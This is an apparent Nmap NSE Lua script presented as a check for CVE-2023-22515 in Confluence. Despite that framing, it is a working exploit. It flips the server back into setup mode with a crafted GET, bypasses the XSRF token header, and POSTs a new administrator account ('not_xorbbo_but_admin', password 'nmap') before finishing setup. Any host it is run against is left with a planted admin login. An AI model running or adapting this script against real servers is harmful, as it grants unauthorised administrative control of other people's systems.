local http = require 'http'

description = [[
  Check if app is vulnerable to CVE-2023-22515
]]

author = "xorbbo"
license = "none"
categories = {"exploit"}

portrule = function(host, port)
  return port.protocol == "tcp"
end

action = function(host, port)
  local output = {}
  local is_vuln = false
  local payload = {
     ['username'] = 'not_xorbbo_but_admin',
     ['fullName'] = 'not_xorbbo_but_admin',
     ['email'] = 'nmap@localhost.ru',
     ['password'] = 'nmap',
     ['confirm'] = 'nmap',
     ['setup-next-button'] = 'Next',
   }
  local headers = {
     header = {
       ["X-Atlassian-Token"] = "no-check",
    }
  }
  local setup_mode_handler = http.get(host, port, '/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false')
  if setup_mode_handler.status == 200 then
    local reg_admin = http.post(host, port, '/setup/setupadministrator.action', headers, nil, payload)
    local response_finish = http.post(host, port, '/setup/finishsetup.action', headers, nil, '')	
    if reg_admin.status == 302 and response_finish.status == 200 then
        is_vuln = true
    end
  end

  if is_vuln then
    output[#output + 1] = "CVE-2023-22515 found!"
  else
    output[#output + 1] = "There is nothing here :("
  end

  return output
end
